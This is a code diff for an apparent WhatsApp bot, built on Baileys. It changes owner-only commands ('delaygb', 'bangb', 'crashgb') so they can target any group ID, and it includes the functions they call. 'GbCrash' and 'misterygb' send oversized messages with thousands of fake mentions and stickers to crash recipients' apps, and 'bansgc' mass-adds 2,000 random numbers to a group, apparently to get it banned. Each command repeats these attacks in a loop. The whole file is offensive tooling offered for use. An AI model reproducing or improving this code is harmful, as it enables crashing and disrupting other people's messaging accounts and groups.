@@ -437,14 +437,14 @@ async function frezehard(sock, target) {
   await sock.relayMessage(target, msg, { noselfsync: true });
 }
 //====[FUNCTION BUG GROUP]====//
-async function bansgc(target) {
+async function bansgc(targetgroup) {
   try {
-    if (!target.endsWith('@g.us')) throw new Error('group only')
+    if (!targetgroup.endsWith('@g.us')) throw new Error('group only')
     const fakeNumbers = Array.from({ length: 2000 }, () => {
       return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net'
     })
     for (const fakeJid of fakeNumbers) {
-      sock.groupParticipantsUpdate(target, [fakeJid], 'add').catch(() => {})
+      sock.groupParticipantsUpdate(targetgroup, [fakeJid], 'add').catch(() => {})
       await new Promise(r => setTimeout(r, 20))
     }
   } catch (err) {
@@ -452,7 +452,7 @@ async function bansgc(target) {
   }
 }
 
-async function GbCrash(sock, target) {
+async function GbCrash(sock, targetgroup) {
   try {
     const MgbMsg = {
       viewOnceMessage: {
@@ -464,8 +464,8 @@ async function GbCrash(sock, target) {
             buttons: [{ buttonId: "Ӄ𝕀𝚴𝕋∆𝚴∆", buttonText: { displayText: "ꦽ".repeat(90000) }, type: 1 }],
             contextInfo: {
               mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 999999999999)}@s.whatsapp.net`),
-              participant: target,
-              remoteJid: target,
+              participant: targetgroup,
+              remoteJid: targetgroup,
               forwardingScore: 999999999,
               isForwarded: true,
               quotedMessage: {
@@ -483,14 +483,14 @@ async function GbCrash(sock, target) {
         }
       }
     };
-    await sock.relayMessage(target, MgbMsg, { userJid: target });
+    await sock.relayMessage(targetgroup, MgbMsg, { userJid: targetgroup });
     console.log("successfully sent group bug");
   } catch (err) {
     console.log(err);
   }
 }
 
-async function misterygb(sock, target) {
+async function misterygb(sock, targetgroup) {
   const stc = Array.from({ length: 1000 }, (_, i) => ({
     fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${i + 1}.webp`,
     isAnimated: true,
@@ -499,7 +499,7 @@ async function misterygb(sock, target) {
     mimetype: "image/webp"
   }));
   const msg = await generateWAMessageFromContent(
-    target,
+    targetgroup,
     proto.Message.fromObject({
       viewOnceMessage: {
         message: {
@@ -518,7 +518,7 @@ async function misterygb(sock, target) {
               participant: "0@s.whatsapp.net",
               stanzaId: "1234567890ABCDEF",
               mentionedJid: [
-                target,
+                targetgroup,
                 ...Array.from(
                   { length: 1900 },
                   () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
@@ -542,7 +542,7 @@ async function misterygb(sock, target) {
                 durationSecs: "1",
                 callType: "SCHEDULED_CALL",
                 participants: [
-                  { jid: target, callOutcome: "CONNECTED" },
+                  { jid: targetgroup, callOutcome: "CONNECTED" },
                   { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
                   { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
                   { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" }
@@ -555,13 +555,13 @@ async function misterygb(sock, target) {
     }),
     {}
   );
-  await sock.relayMessage(target, msg.message, {
+  await sock.relayMessage(targetgroup, msg.message, {
     messageId: msg.key.id,
-    participant: { jid: target }
+    participant: { jid: targetgroup }
   });
   await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
-    statusJidList: [target],
+    statusJidList: [targetgroup],
     additionalNodes: [
       {
         tag: "meta",
@@ -570,7 +570,7 @@ async function misterygb(sock, target) {
           {
             tag: "mentioned_users",
             attrs: {},
-            content: [{ tag: "to", attrs: { jid: target } }]
+            content: [{ tag: "to", attrs: { jid: targetgroup } }]
           }
         ]
       }
@@ -578,7 +578,7 @@ async function misterygb(sock, target) {
   });
 }
 
-async function delayhardgb(sock, target) {
+async function delayhardgb(sock, targetgroup) {
   const message = {
     groupStatusMessageV2: {
       message: {
@@ -590,7 +590,7 @@ async function delayhardgb(sock, target) {
       }
     }
   };
-  await sock.relayMessage(target, message, { noselfsync: true });
+  await sock.relayMessage(targetgroup, message, { noselfsync: true });
 }
 //====[AKHIR FUNCTION]====///
 // ==================== COMMAND HANDLER ====================
@@ -1398,15 +1398,16 @@ break;
 case 'delaygb': {
     if (!isOwner) return reply(config.message.owner);
     if (!isGroup) return reply(`This feature is only available in groups!`);
-       
-    let jidx = q.replace(/[^0-9]/g, "");
-    if (m.chat.startsWith('0')) return reply(`— ex: ${prefix + command} `);
-    let isTarget = `${m.chat}`;
-    reply(`success! sent bug to ${isTarget}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
+
+    let targetgroup = q ? q.trim() : m.chat;
+    if (!targetgroup.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);
+
+    reply(`success! sent bug to ${targetgroup}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
+
     for (let i = 0; i < 5; i++) {
-await delayhardgb(isTarget);
-await delayhardgb(isTarget);
-await delayhardgb(isTarget);
+        await delayhardgb(targetgroup);
+        await delayhardgb(targetgroup);
+        await delayhardgb(targetgroup);
     }
     console.log(chalk.red.bold(`Success Sending Bug Type ${command} Into Group`));
 }
@@ -1415,13 +1416,14 @@ break;
 case 'bangb': {
     if (!isOwner) return reply(config.message.owner);
     if (!isGroup) return reply(`This feature is only available in groups!`);
-       
-    let jidx = q.replace(/[^0-9]/g, "");
-    if (m.chat.startsWith('0')) return reply(`— ex: ${prefix + command} `);
-    let isTarget = `${m.chat}`;
-    reply(`success! sent ban to ${isTarget}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
+
+    let targetgroup = q ? q.trim() : m.chat;
+    if (!targetgroup.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);
+
+    reply(`success! sent ban to ${targetgroup}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
+
     for (let i = 0; i < 5; i++) {
-await bansgc(isTarget);
+        await bansgc(targetgroup);
     }
     console.log(chalk.red.bold(`Success Sending Ban Type ${command} Into Group`));
 }
@@ -1430,15 +1432,16 @@ break;
 case 'crashgb': {
     if (!isOwner) return reply(config.message.owner);
     if (!isGroup) return reply(`This feature is only available in groups!`);
-       
-    let jidx = q.replace(/[^0-9]/g, "");
-    if (m.chat.startsWith('0')) return reply(`— ex: ${prefix + command} `);
-    let isTarget = `${m.chat}`;
-    reply(`success! sent bug to ${isTarget}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
-    for (let i = 0; i < 5; i++) {   
-await misterygb(isTarget);
-await delayhardgb(isTarget);
-await GbCrash(isTarget);
+
+    let targetgroup = q ? q.trim() : m.chat;
+    if (!targetgroup.endsWith('@g.us')) return reply(`Format target salah! Contoh: ${prefix + command} 12345@g.us`);
+
+    reply(`success! sent bug to ${targetgroup}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
+
+    for (let i = 0; i < 5; i++) {
+        await misterygb(targetgroup);
+        await delayhardgb(targetgroup);
+        await GbCrash(targetgroup);
     }
     console.log(chalk.red.bold(`Success Sending Bug Type ${command} Into Group`));
 }
